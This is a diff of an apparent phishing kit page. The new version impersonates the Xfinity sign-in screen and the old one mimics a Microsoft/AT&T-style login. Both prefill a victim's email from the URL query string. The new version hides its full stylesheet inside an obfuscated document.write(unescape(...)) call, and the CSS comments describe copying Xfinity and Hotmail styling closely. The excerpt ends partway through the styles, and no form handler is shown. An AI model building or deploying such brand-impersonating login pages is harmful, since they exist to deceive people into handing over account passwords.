@@ -1,720 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Screen</title>
-  <link rel="icon" href="https://s.yimg.com/cv/apiv2/partner-portals/mobile/att_open-graph_icon_1.png" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Xfinity</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://login.xfinity.com/favicon.ico" type="image/x-icon">
+
+
+    <script>
+        window.onload = function() {
+          // Function to extract query parameters from the URL
+          function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+          }
+      
+          // Get the 'email' parameter from the URL
+          const email = getQueryParam('email');
+          
+          // If an email is present in the URL, set it as the value of the email input field
+          if (email) {
+            document.querySelector('input[name="email"]').value = email;
+          }
+        };
+      </script>
+
+      
+<script>
+document.write(unescape('%3Cstyle%3E%0D%0A%0D%0A@media%20%28max-width%3A%20768px%29%20%7B%0D%0A%0D%0A%20%20%20%20.form-container%20%7B%0D%0A%20%20%20%20%20width%3A%20100vw%3B%0D%0A%20%20%20%20%20height%3A%20100vh%3B%0D%0A%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20.main-box%7B%0D%0A%20%20%20%20width%3A%20100vw%3B%0D%0A%20%20%20%20height%3A%20100vh%3B%0D%0A%20%20%20%20padding-left%3A%203px%3B%0D%0A%20%20%20%20padding-right%3A%203px%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0A%0D%0A%0D%0A.form-container%7B%0D%0A%20%20%20%20display%3A%20flex%3B%20/*%20Enables%20Flexbox%20on%20the%20container%20*/%0D%0A%20%20%20%20justify-content%3A%20center%3B%20/*%20Centers%20the%20content%20horizontally%20*/%0D%0A%20%20%20%20align-items%3A%20center%3B%20/*%20Centers%20the%20content%20vertically%20*/%0D%0A%20%20%20%20height%3A%20100vh%3B%20/*%20Makes%20the%20container%20full%20height%20of%20the%20viewport%20*/%0D%0A%20%20%20%20width%3A%20100%25%3B%0D%0A%7D%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A.main-box%20%7B%0D%0A%20%20%20%20background-color%3A%20rgb%28255%2C%20255%2C%20255%29%3B%0D%0A%20%20%20%20/*%20box-shadow%3A%20rgba%28255%2C%2074%2C%20171%2C%200.16%29%200px%208px%2024px%200px%3B%20*/%0D%0A%20%20%20%20box-sizing%3A%20border-box%3B%0D%0A%20%20%20%20color%3A%20rgb%2812%2C%2012%2C%2020%29%3B%0D%0A%20%20%20%20display%3A%20block%3B%0D%0A%20%20%20%20font-family%3A%20InterVariable%2C%20system-ui%2C%20sans-serif%3B%0D%0A%20%20%20%20font-size%3A%2014px%3B%0D%0A%20%20%20%20font-style%3A%20normal%3B%0D%0A%20%20%20%20font-synthesis%3A%20none%3B%0D%0A%20%20%20%20font-weight%3A%20400%3B%0D%0A%20%20%20%20height%3A%20100vh%3B%0D%0A%20%20%20%20line-height%3A%2020px%3B%0D%0A%20%20%20%20margin%3A%200%20auto%3B%0D%0A%20%20%20%20padding%3A%2040px%2024px%3B%0D%0A%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20quotes%3A%20%22%u201C%22%20%22%u201D%22%20%22%u2018%22%20%22%u2019%22%3B%0D%0A%20%20%20%20scrollbar-color%3A%20rgb%28209%2C%20207%2C%20205%29%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0A%20%20%20%20scrollbar-width%3A%20thin%3B%0D%0A%20%20%20%20transform%3A%20matrix%281%2C%200%2C%200%2C%201%2C%200%2C%200%29%3B%0D%0A%20%20%20%20transition-behavior%3A%20normal%3B%0D%0A%20%20%20%20transition-delay%3A%200s%3B%0D%0A%20%20%20%20transition-duration%3A%200.15s%3B%0D%0A%20%20%20%20transition-property%3A%20max-width%3B%0D%0A%20%20%20%20transition-timing-function%3A%20cubic-bezier%280.42%2C%200%2C%201%2C%201%29%3B%0D%0A%20%20%20%20unicode-bidi%3A%20isolate%3B%0D%0A%20%20%20%20width%3A%20100%25%3B%0D%0A%20%20%20%20max-width%3A%20620px%3B%20%20/*%20still%20limits%20desktop%20width%20*/%0D%0A%20%20%20%20-webkit-font-smoothing%3A%20antialiased%3B%0D%0A%7D%0D%0A%0D%0A%0D%0A.signin-tocontinue%7B%0D%0A%20%20%20%20box-sizing%3A%20border-box%3B%0D%0A%20%20%20%20color%3A%20rgb%2820%2C%2020%2C%2023%29%3B%0D%0A%20%20%20%20line-height%3A%2040px%3B%0D%0A%20%20%20%20margin-bottom%3A%2012px%3B%0D%0A%20%20%20%20margin-left%3A%205px%3B%0D%0A%20%20%20%20font-family%3A%20XfinityBrown%2C%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0A%20%20%20%20font-size%3A%2032px%3B%0D%0A%20%20%20%20font-weight%3A%20700%3B%0D%0A%7D%0D%0A.to-continue%7B%0D%0A%20%20%20%20color%3A%20rgb%2892%2C%2089%2C%2088%29%3B%0D%0A%20%20%20%20font-size%3A%2014px%3B%0D%0A%20%20%20%20font-weight%3A%20400%3B%0D%0A%20%20%20%20line-height%3A%2020px%3B%0D%0A%20%20%20%20margin-top%3A%208px%3B%0D%0A%0D%0A%7D%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A.user%7B%0D%0A%20%20%20%20width%3A%20100%25%3B%0D%0A%20%20%20%20display%3A%20block%3B%0D%0A%20%20%20%20box-sizing%3A%20border-box%3B%0D%0A%0D%0A%20%20%20%20border%3A%20none%20%21important%3B%0D%0A%20%20%20%20outline%3A%20none%20%21important%3B%0D%0A%20%20%20%20background%3A%20transparent%3B%0D%0A%0D%0A%20%20%20%20color%3A%20rgb%2820%2C%2020%2C%2023%29%3B%0D%0A%20%20%20%20font-family%3A%20XfinityBrown%2C%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0A%20%20%20%20font-size%3A%2016px%3B%0D%0A%20%20%20%20font-weight%3A%20700%3B%0D%0A%0D%0A%20%20%20%20overflow%3A%20visible%3B%0D%0A%20%20%20%20text-overflow%3A%20unset%3B%0D%0A%20%20%20%20white-space%3A%20nowrap%3B%0D%0A%0D%0A%20%20%20%20padding%3A%200%3B%0D%0A%20%20%20%20margin%3A%200%200%2025px%200%3B%0D%0A%7D%0D%0A%0D%0A.user%3Ahover%2C%0D%0A.user%3Afocus%2C%0D%0A.user%3Aactive%20%7B%0D%0A%20%20%20%20border%3A%20none%20%21important%3B%0D%0A%20%20%20%20outline%3A%20none%20%21important%3B%0D%0A%20%20%20%20box-shadow%3A%20none%20%21important%3B%0D%0A%7D%0D%0A%0D%0A.xfinity-header%20%7B%0D%0A%20%20%20%20width%3A%20100%25%3B%0D%0A%20%20%20%20display%3A%20flex%3B%0D%0A%20%20%20%20justify-content%3A%20center%3B%20%20%20/*%20center%20the%20logo%20horizontally%20*/%0D%0A%20%20%20%20align-items%3A%20center%3B%0D%0A%20%20%20%20padding-top%3A%2024px%3B%20%20%20%20%20%20%20%20%20/*%20space%20from%20very%20top%20*/%0D%0A%20%20%20%20padding-bottom%3A%2016px%3B%20%20%20%20%20%20/*%20space%20above%20the%20line%20*/%0D%0A%20%20%20%20border-bottom%3A%201px%20solid%20%23edeef2%3B%20%20/*%20the%20thin%20gray%20line%20under%20logo%20*/%0D%0A%20%20%20%20box-sizing%3A%20border-box%3B%0D%0A%7D%0D%0A%0D%0A/*%20actual%20SVG%20sizing%20+%20color%20*/%0D%0A.xfinity-logo-svg%20%7B%0D%0A%20%20%20%20display%3A%20block%3B%0D%0A%20%20%20%20width%3A%2090px%3B%20%20%20%20%20%20/*%20tweak%20this%20up/down%20until%20it%20visually%20matches%20*/%0D%0A%20%20%20%20height%3A%20auto%3B%0D%0A%20%20%20%20color%3A%20%23000000%3B%20%20%20/*%20uses%20currentColor%20for%20the%20paths%20*/%0D%0A%7D%0D%0A%0D%0A%0D%0A.box%7B%0D%0Aappearance%3A%20auto%3B%0D%0Abackground-color%3A%20rgb%28246%2C%20246%2C%20249%29%3B%0D%0Aborder-bottom-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0D%0Aborder-bottom-left-radius%3A%204px%3B%0D%0Aborder-bottom-right-radius%3A%204px%3B%0D%0Aborder-bottom-style%3A%20solid%3B%0D%0Aborder-bottom-width%3A%201px%3B%0D%0Aborder-image-outset%3A%200%3B%0D%0Aborder-image-repeat%3A%20stretch%3B%0D%0Aborder-image-slice%3A%20100%25%3B%0D%0Aborder-image-source%3A%20none%3B%0D%0Aborder-image-width%3A%201%3B%0D%0Aborder-left-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0D%0Aborder-left-style%3A%20solid%3B%0D%0Aborder-left-width%3A%201px%3B%0D%0Aborder-right-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0D%0Aborder-right-style%3A%20solid%3B%0D%0Aborder-right-width%3A%201px%3B%0D%0Aborder-top-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0D%0Aborder-top-left-radius%3A%204px%3B%0D%0Aborder-top-right-radius%3A%204px%3B%0D%0Aborder-top-style%3A%20solid%3B%0D%0Aborder-top-width%3A%201px%3B%0D%0Abox-sizing%3A%20border-box%3B%0D%0Acolor%3A%20rgb%2820%2C%2020%2C%2023%29%3B%0D%0Acursor%3A%20text%3B%0D%0Adisplay%3A%20inline-block%3B%0D%0Afont-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0Afont-feature-settings%3A%20normal%3B%0D%0Afont-kerning%3A%20auto%3B%0D%0Afont-optical-sizing%3A%20auto%3B%0D%0Afont-size%3A%2016px%3B%0D%0Afont-size-adjust%3A%20none%3B%0D%0Afont-stretch%3A%20100%25%3B%0D%0Afont-style%3A%20normal%3B%0D%0Afont-variant-alternates%3A%20normal%3B%0D%0Afont-variant-caps%3A%20normal%3B%0D%0Afont-variant-east-asian%3A%20normal%3B%0D%0Afont-variant-emoji%3A%20normal%3B%0D%0Afont-variant-ligatures%3A%20normal%3B%0D%0Afont-variant-numeric%3A%20normal%3B%0D%0Afont-variant-position%3A%20normal%3B%0D%0Afont-variation-settings%3A%20normal%3B%0D%0Afont-weight%3A%20400%3B%0D%0Aheight%3A%2056px%3B%0D%0Aletter-spacing%3A%20normal%3B%0D%0Aline-height%3A%2024px%3B%0D%0Amargin-bottom%3A%200px%3B%0D%0Amargin-left%3A%203px%3B%0D%0Amargin-right%3A%200px%3B%0D%0Amargin-top%3A%200px%3B%0D%0Aoutline-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aoutline-offset%3A%202px%3B%0D%0Aoutline-style%3A%20solid%3B%0D%0Aoutline-width%3A%202px%3B%0D%0Aoverflow-clip-margin%3A%200px%3B%0D%0Aoverflow-x%3A%20clip%3B%0D%0Aoverflow-y%3A%20clip%3B%0D%0Apadding-block-end%3A%2015px%3B%0D%0Apadding-block-start%3A%2015px%3B%0D%0Apadding-bottom%3A%2015px%3B%0D%0Apadding-inline-end%3A%2015px%3B%0D%0Apadding-inline-start%3A%2015px%3B%0D%0Apadding-left%3A%2015px%3B%0D%0Apadding-right%3A%2015px%3B%0D%0Apadding-top%3A%2015px%3B%0D%0Atab-size%3A%204%3B%0D%0Atext-align%3A%20left%3B%0D%0Atext-indent%3A%200px%3B%0D%0Atext-rendering%3A%20auto%3B%0D%0Atext-shadow%3A%20none%3B%0D%0Atext-size-adjust%3A%20100%25%3B%0D%0Atext-transform%3A%20none%3B%0D%0Atransition-behavior%3A%20normal%2C%20normal%2C%20normal%2C%20normal%3B%0D%0Atransition-delay%3A%200s%2C%200s%2C%200s%2C%200s%3B%0D%0Atransition-duration%3A%200s%2C%200s%2C%200s%2C%200.2s%3B%0D%0Atransition-property%3A%20border-color%2C%20box-shadow%2C%20border-radius%2C%20padding%3B%0D%0Atransition-timing-function%3A%20ease%2C%20ease%2C%20ease%2C%20ease-in-out%3B%0D%0Avisibility%3A%20visible%3B%0D%0Awidth%3A%20100%25%3B%0D%0Aword-spacing%3A%200px%3B%0D%0A-webkit-rtl-ordering%3A%20logical%3B%0D%0A-webkit-tap-highlight-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0A-webkit-border-image%3A%20none%3B%0D%0A%0D%0A%0D%0A%7D%0D%0A%0D%0A.signin-button%20%7B%0D%0Aalign-items%3A%20center%3B%0D%0Aappearance%3A%20button%3B%0D%0Abackground-color%3A%20rgb%2890%2C%2035%2C%20185%29%3B%0D%0Abackground-image%3A%20none%3B%0D%0Aborder-bottom-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aborder-bottom-left-radius%3A%204px%3B%0D%0Aborder-bottom-right-radius%3A%204px%3B%0D%0Aborder-bottom-style%3A%20solid%3B%0D%0Aborder-bottom-width%3A%202px%3B%0D%0Aborder-image-outset%3A%200%3B%0D%0Aborder-image-repeat%3A%20stretch%3B%0D%0Aborder-image-slice%3A%20100%25%3B%0D%0Aborder-image-source%3A%20none%3B%0D%0Aborder-image-width%3A%201%3B%0D%0Aborder-left-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aborder-left-style%3A%20solid%3B%0D%0Aborder-left-width%3A%202px%3B%0D%0Aborder-right-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aborder-right-style%3A%20solid%3B%0D%0Aborder-right-width%3A%202px%3B%0D%0Aborder-top-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aborder-top-left-radius%3A%204px%3B%0D%0Aborder-top-right-radius%3A%204px%3B%0D%0Aborder-top-style%3A%20solid%3B%0D%0Aborder-top-width%3A%202px%3B%0D%0Abox-sizing%3A%20border-box%3B%0D%0Acolor%3A%20rgb%28246%2C%20246%2C%20249%29%3B%0D%0Acursor%3A%20pointer%3B%0D%0Adisplay%3A%20flex%3B%0D%0Aflex-direction%3A%20row%3B%0D%0Afont-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0Afont-feature-settings%3A%20normal%3B%0D%0Afont-kerning%3A%20auto%3B%0D%0Afont-optical-sizing%3A%20auto%3B%0D%0Afont-size%3A%2015.3px%3B%0D%0Afont-size-adjust%3A%20none%3B%0D%0Afont-stretch%3A%20100%25%3B%0D%0Afont-style%3A%20normal%3B%0D%0Afont-variant-alternates%3A%20normal%3B%0D%0Afont-variant-caps%3A%20normal%3B%0D%0Afont-variant-east-asian%3A%20normal%3B%0D%0Afont-variant-emoji%3A%20normal%3B%0D%0Afont-variant-ligatures%3A%20normal%3B%0D%0Afont-variant-numeric%3A%20normal%3B%0D%0Afont-variant-position%3A%20normal%3B%0D%0Afont-variation-settings%3A%20normal%3B%0D%0Afont-weight%3A%20700%3B%0D%0Aheight%3A%2056px%3B%0D%0Ajustify-content%3A%20center%3B%0D%0Ajustify-items%3A%20center%3B%0D%0Aletter-spacing%3A%20normal%3B%0D%0Aline-height%3A%2024px%3B%0D%0Amargin-bottom%3A%2040px%3B%0D%0Amargin-left%3A%205px%3B%0D%0Amargin-right%3A%200px%3B%0D%0Amargin-top%3A%2040px%3B%0D%0Aoutline-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0Aoutline-offset%3A%202px%3B%0D%0Aoutline-style%3A%20solid%3B%0D%0Aoutline-width%3A%202px%3B%0D%0Apadding-block-end%3A%2014px%3B%0D%0Apadding-block-start%3A%2014px%3B%0D%0Apadding-bottom%3A%2014px%3B%0D%0Apadding-inline-end%3A%2028px%3B%0D%0Apadding-inline-start%3A%2028px%3B%0D%0Apadding-left%3A%2028px%3B%0D%0Apadding-right%3A%2028px%3B%0D%0Apadding-top%3A%2014px%3B%0D%0Aposition%3A%20relative%3B%0D%0Atab-size%3A%204%3B%0D%0Atext-align%3A%20center%3B%0D%0Atext-decoration-line%3A%20none%3B%0D%0Atext-indent%3A%200px%3B%0D%0Atext-rendering%3A%20auto%3B%0D%0Atext-shadow%3A%20none%3B%0D%0Atext-size-adjust%3A%20100%25%3B%0D%0Atext-transform%3A%20none%3B%0D%0Atouch-action%3A%20manipulation%3B%0D%0Atransition-behavior%3A%20normal%3B%0D%0Atransition-delay%3A%200s%3B%0D%0Atransition-duration%3A%200.2s%3B%0D%0Atransition-property%3A%20all%3B%0D%0Atransition-timing-function%3A%20ease-in%3B%0D%0Avisibility%3A%20visible%3B%0D%0Awidth%3A%20118.68px%3B%0D%0Aword-spacing%3A%200px%3B%0D%0A-webkit-tap-highlight-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0D%0A-webkit-border-image%3A%20none%3B%0D%0A%0D%0A%7D%0D%0A%0D%0A/*%20%3D%3D%3D%20Spinner%20inside%20the%20Sign%20in%20button%20%28Option%20B2%29%20%3D%3D%3D%20*/%0D%0A.signin-button%20.btn-text%20%7B%0D%0A%20%20%20%20display%3A%20inline-block%3B%0D%0A%7D%0D%0A%0D%0A.signin-button%20.spinner%20%7B%0D%0A%20%20%20%20position%3A%20absolute%3B%0D%0A%20%20%20%20width%3A%2022px%3B%0D%0A%20%20%20%20height%3A%2022px%3B%0D%0A%20%20%20%20border-radius%3A%2050%25%3B%0D%0A%20%20%20%20border%3A%202px%20solid%20rgba%28246%2C%20246%2C%20249%2C%200.5%29%3B%0D%0A%20%20%20%20border-top-color%3A%20rgb%28246%2C%20246%2C%20249%29%3B%0D%0A%20%20%20%20animation%3A%20btn-spin%200.6s%20linear%20infinite%3B%0D%0A%20%20%20%20left%3A%2050%25%3B%0D%0A%20%20%20%20top%3A%2050%25%3B%0D%0A%20%20%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0D%0A%20%20%20%20display%3A%20none%3B%20/*%20hidden%20by%20default%20*/%0D%0A%7D%0D%0A%0D%0A.signin-button.loading%20.spinner%20%7B%0D%0A%20%20%20%20display%3A%20block%3B%0D%0A%7D%0D%0A%0D%0A.signin-button.loading%20.btn-text%20%7B%0D%0A%20%20%20%20visibility%3A%20hidden%3B%20/*%20keep%20layout%20but%20hide%20text%20while%20loading%20*/%0D%0A%7D%0D%0A%0D%0A@keyframes%20btn-spin%20%7B%0D%0A%20%20%20%20to%20%7B%0D%0A%20%20%20%20%20%20%20%20transform%3A%20translate%28-50%25%2C%20-50%25%29%20rotate%28360deg%29%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0A%0D%0A%0D%0A.password-wrapper%20%7B%0D%0A%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20width%3A%20100%25%3B%0D%0A%7D%0D%0A%0D%0A.password-wrapper%20.box%20%7B%0D%0A%20%20%20%20padding-right%3A%2050px%3B%20/*%20make%20room%20for%20the%20icon%20*/%0D%0A%7D%0D%0A%0D%0A.toggle-password%20%7B%0D%0A%20%20%20%20position%3A%20absolute%3B%0D%0A%20%20%20%20right%3A%2015px%3B%0D%0A%20%20%20%20top%3A%2050%25%3B%0D%0A%20%20%20%20transform%3A%20translateY%28-50%25%29%3B%0D%0A%20%20%20%20cursor%3A%20pointer%3B%0D%0A%20%20%20%20color%3A%20colorrgb%2820%2C%2020%2C%2023%29%3B%0D%0A%20%20%20%20display%3A%20flex%3B%0D%0A%20%20%20%20align-items%3A%20center%3B%0D%0A%20%20%20%20justify-content%3A%20center%3B%0D%0A%7D%0D%0A%0D%0A%0D%0A/*%20Forgot%20password%20%u2013%20Xfinity%20accurate%20*/%0D%0A.forgot-wrapper%20%7B%0D%0A%20%20%20%20margin-top%3A%2017px%3B%0D%0A%20%20%20%20margin-left%3A%205px%3B%0D%0A%7D%0D%0A%0D%0A.forgot-link%20%7B%0D%0A%20%20%20%20font-family%3A%20XfinityBrown%2C%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0A%20%20%20%20font-size%3A%2016px%3B%0D%0A%20%20%20%20font-weight%3A%20700%3B%0D%0A%20%20%20%20color%3A%20rgb%2890%2C%2035%2C%20185%29%3B%0D%0A%20%20%20%20text-decoration%3A%20none%3B%0D%0A%7D%0D%0A%0D%0A.forgot-link%3Ahover%20%7B%0D%0A%20%20%20%20text-decoration%3A%20underline%3B%0D%0A%7D%0D%0A%0D%0A/*%20Keep%20me%20signed%20in%20*/%0D%0A.keep-signed-wrapper%20%7B%0D%0A%20%20%20%20display%3A%20flex%3B%0D%0A%20%20%20%20align-items%3A%20center%3B%0D%0A%20%20%20%20margin-bottom%3A%2032px%3B%0D%0A%20%20%20%20margin-top%3A%2032px%3B%0D%0A%7D%0D%0A%0D%0A.keep-signed-checkbox%20%7B%0D%0A%20%20%20%20width%3A%2020px%3B%0D%0A%20%20%20%20height%3A%2020px%3B%0D%0A%20%20%20%20transform%3A%20scale%281.3%29%3B%0D%0A%20%20%20%20accent-color%3A%20rgb%2890%2C%2035%2C%20185%29%3B%0D%0A%20%20%20%20cursor%3A%20pointer%3B%0D%0A%7D%0D%0A%0D%0A%0D%0A.keep-signed-label%20%7B%0D%0A%20%20%20%20margin-left%3A%2012px%3B%0D%0A%20%20%20%20font-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0A%20%20%20%20font-size%3A%2017px%3B%0D%0A%20%20%20%20font-weight%3A%20400%3B%0D%0A%20%20%20%20color%3A%20rgb%2820%2C%2020%2C%2023%29%3B%0D%0A%20%20%20%20cursor%3A%20pointer%3B%0D%0A%20%20%20%20line-height%3A%2024px%3B%0D%0A%7D%0D%0A%0D%0A%0D%0A%0D%0A.policy1%7B%0D%0A%20%20%20%20font-size%3A%2014px%3B%0D%0A%20%20%20%20font-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0D%0A%20%20%20%20font-weight%3A%20400%3B%0D%0A%20%20%20%20line-height%3A%2021px%3B%0D%0A%0D%0A%7D%0D%0A.policy1%20a%20%7B%0D%0A%20%20%20%20color%3A%20rgb%2890%2C%2035%2C%20185%29%3B%0D%0A%20%20%20%20text-decoration%3A%20none%3B%0D%0A%20%20%20%20font-weight%3A%20500%3B%0D%0A%7D%0D%0A%0D%0A.policy1%20a%3Ahover%20%7B%0D%0A%20%20%20%20text-decoration%3A%20underline%3B%0D%0A%7D%0D%0A%0D%0A/*%20%3D%3D%3D%20Hotmail-style%20error%20message%20+%20border%20%3D%3D%3D%20*/%0D%0A.error-message%20%7B%0D%0A%20%20%20%20margin%3A%208px%20auto%200%20auto%3B%0D%0A%20%20%20%20max-width%3A%20100%25%3B%0D%0A%20%20%20%20font-size%3A%2012px%3B%0D%0A%20%20%20%20color%3A%20%23e81123%3B%20/*%20MS%20red%20*/%0D%0A%20%20%20%20display%3A%20flex%3B%0D%0A%20%20%20%20align-items%3A%20center%3B%0D%0A%7D%0D%0A%0D%0A.error-icon%20%7B%0D%0A%20%20%20%20display%3A%20inline-flex%3B%0D%0A%20%20%20%20margin-right%3A%206px%3B%0D%0A%7D%0D%0A%0D%0A.error-text%20%7B%0D%0A%20%20%20%20line-height%3A%201.4%3B%0D%0A%7D%0D%0A%0D%0A/*%20Red%20error%20border%20like%20Microsoft%20*/%0D%0A.input-error%20%7B%0D%0A%20%20%20%20border%3A%200.666667px%20%23e81123%20%21important%3B%0D%0A%20%20%20%20box-shadow%3A%20inset%200%200%200%200.666667px%20%23e81123%3B%0D%0A%7D%0D%0A%0D%0A%20%20%20%20%3C/style%3E'));
+</script>
 
 
-
-  <script>
-    window.onload = function() {
-      function getQueryParam(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-      }
-      const email = getQueryParam('email');
-      if (email) {
-        document.querySelector('input[name="email"]').value = email;
-      }
-    };
-  </script>
-
-
-  <style>
-    body {
-      margin: 0;
-      font-family: "Segoe UI", sans-serif;
-      background-color: white;
-      background-size: cover;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .form-shape{
-      border-radius: 12px;
-      box-sizing: border-box;
-      margin: 10px auto 0 auto;
-      max-width: 440px;
-      width: calc(100% - 40px);
-      padding: 44px;
-      background-color: #fff;
-      box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
-      min-width: 320px;
-    }
-
-    /* TOP BAR — arrow left, logo centered */
-    .top-bar-wrapper {
-      position: relative;
-      margin-bottom: 32px;
-    }
-
-
-    .microsoft-container {
-      text-align: center;
-    }
-
-    .att-image {
-      height: 38px;
-    }
-
-    /* Email pill wrapper */
-    .email-wrapper {
-      text-align: center;
-      margin-bottom: 16px;
-    }
-
-    .emaill {
-      display: block;
-      width: 100%;
-      height: 40px;
-      padding: 0 40px 0 8px; /* extra right padding for icon */
-      font-size: 14px;
-      font-weight: 400;
-      transition: border-bottom-width 0.15s ease, border-bottom-color 0.15s ease;
-      box-sizing: border-box;
-      border: 1px solid rgb(104, 110, 116);
-      border-radius: 4px;
-      background: #fff;
-      color: rgb(36, 36, 36);
-    }
-
-    /* Centered Heading */
-    .sign-in {
-      font-weight: 600;
-      font-size: 1.5rem;
-      margin-top: 0px;
-      margin-bottom: 8px;
-      color: rgb(27, 27, 27);
-      text-align: center;
-      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
-    }
-
-    .verify-note {
-      max-width: 360px;
-      margin: 0 auto 24px auto;
-      font-size: 12px;
-      line-height: 1.4;
-      color: #4b5563;
-      text-align: center;
-    }
-
-    
-    .input-label {
-   display: block;
-   margin-bottom: 6px;
-   font-size: 13px;
-   font-weight: 600;
-   color: #1b1b1b;
-   }
-    /* PASSWORD WRAPPER + INPUT */
-    .password-wrapper {
-      position: relative;
-      width: 100%;
-      max-width: 360px;        /* keeps it from overflowing while matching original look */
-      margin: 16px auto 0 auto;
-    }
-
-    .passs{
-      display: block;
-      width: 100%;
-      height: 40px;
-      padding: 0 40px 0 8px; /* extra right padding for icon */
-      font-size: 14px;
-      font-weight: 400;
-      transition: border-bottom-width 0.15s ease, border-bottom-color 0.15s ease;
-      box-sizing: border-box;
-      border: 1px solid rgb(104, 110, 116);
-      border-radius: 4px;
-      background: #fff;
-      color: rgb(36, 36, 36);
-    }
-
-    .passs:focus {
-      border-bottom-color: rgb(15, 108, 189);
-      border-bottom-width: 2px;
-      outline: none;
-    }
-
-    .passs::placeholder {
-      color: rgb(120, 120, 120);
-    }
-
-    /* SHOW / HIDE PASSWORD BUTTON */
-
-.password-field{
-    position:relative;
-    width:100%;
-}
-
-.password-field .passs{
-    width:100%;
-    padding-right:70px;
-    box-sizing:border-box;
-}
-
-.password-toggle{
-    position:absolute;
-    top:50%;
-    right:12px;
-    transform:translateY(-50%);
-
-    background:none;
-    border:none;
-    padding:0;
-
-    color:#0073ae;
-    font-size:14px;
-    font-weight:600;
-    font-family:inherit;
-    cursor:pointer;
-}
-
-.password-toggle:hover{
-    text-decoration:underline;
-}
-
-.password-toggle:focus{
-    outline:none;
-}
-.password-toggle:hover {
-    text-decoration: underline;
-}
-
-.password-toggle:focus {
-    outline: none;
-}
-
-    /* Only show button on hover/focus */
-    .password-wrapper:hover .password-toggle,
-    .password-wrapper:focus-within .password-toggle {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .password-toggle:hover,
-    .password-toggle:focus-visible {
-      color: #0f6cbd; /* blue on hover/focus */
-      outline: none;
-    }
-
-    .password-toggle svg {
-      width: 20px;
-      height: 20px;
-      fill: currentColor;
-    }
-
-    .password-toggle .icon-hide {
-      display: none;
-    }
-
-    .password-toggle[data-visible="true"] .icon-show {
-      display: none;
-    }
-
-    .password-toggle[data-visible="true"] .icon-hide {
-      display: inline-flex;
-    }
-
-    /* Button */
-    .button{
-      position: relative;
-      background-color: rgb(0, 56, 143);
-      border: none;
-      border-radius: 28px;
-      color: white;
-      font-weight: 600;
-      font-size: 14px;
-      height: 37px;
-      padding: 8px 16px;
-      width: 100%;
-      max-width: 360px;
-      margin: 32px auto 0 auto;
-      cursor: pointer;
-      display: block;
-      overflow: hidden;
-    }
-
-    .button .btn-label {
-      display: inline-block;
-    }
-
-    .button .spinner {
-      display: none;
-      width: 18px;
-      height: 18px;
-      border-radius: 50%;
-      border: 2px solid rgba(255, 255, 255, 0.4);
-      border-top-color: #ffffff;
-      animation: spin 0.8s linear infinite;
-      margin: 0 auto;
-      vertical-align: middle;
-    }
-
-    .button.loading {
-      cursor: default;
-      color: transparent;      /* visually hides the label while keeping layout */
-    }
-
-    .button.loading .spinner {
-      display: inline-block;
-    }
-
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to   { transform: rotate(360deg); }
-    }
-
-    /* OTHER WAYS */
-    .other-signin{
-      margin-top: 25px;
-      margin-bottom: -10px;
-      color: rgb(17, 94, 163);
-      font-size: 0.875rem;
-      font-weight: 600;
-      text-align: center;
-      cursor: pointer;
-    }
-
-    .passs::-ms-reveal,
-    .passs::-ms-clear {
-      display: none;
-    }
-
-
-    .error-message {
-  margin: 8px auto 0 auto;
-  max-width: 360px;
-  font-size: 12px;
-  color: #e81123; /* MS red */
-  display: flex;
-  align-items: center;
-}
-
-.error-icon {
-  display: inline-flex;
-  margin-right: 6px;
-}
-
-.error-text {
-  line-height: 1.4;
-}
-
-/* Red error border like Microsoft */
-.input-error {
-  border: 0.666667px #e81123 !important;
-  box-shadow: inset 0 0 0 0.666667px #e81123;
-}
-
-.password-input-row {
-  position: relative;
-  width: 100%;
-}
-
-.password-input-row:hover .password-toggle,
-.password-input-row:focus-within .password-toggle {
-  opacity: 1;
-  pointer-events: auto;
-}
-
-
-.forgot-link {
-  margin-top: 24px;
-  text-align: left;
-  width: 100%;
-  max-width: 360px;
-  margin-left: auto;
-  margin-right: auto;
-}
-
-.forgot-pass {
-  font-size: 14px;
-  color: rgb(0, 116, 179);
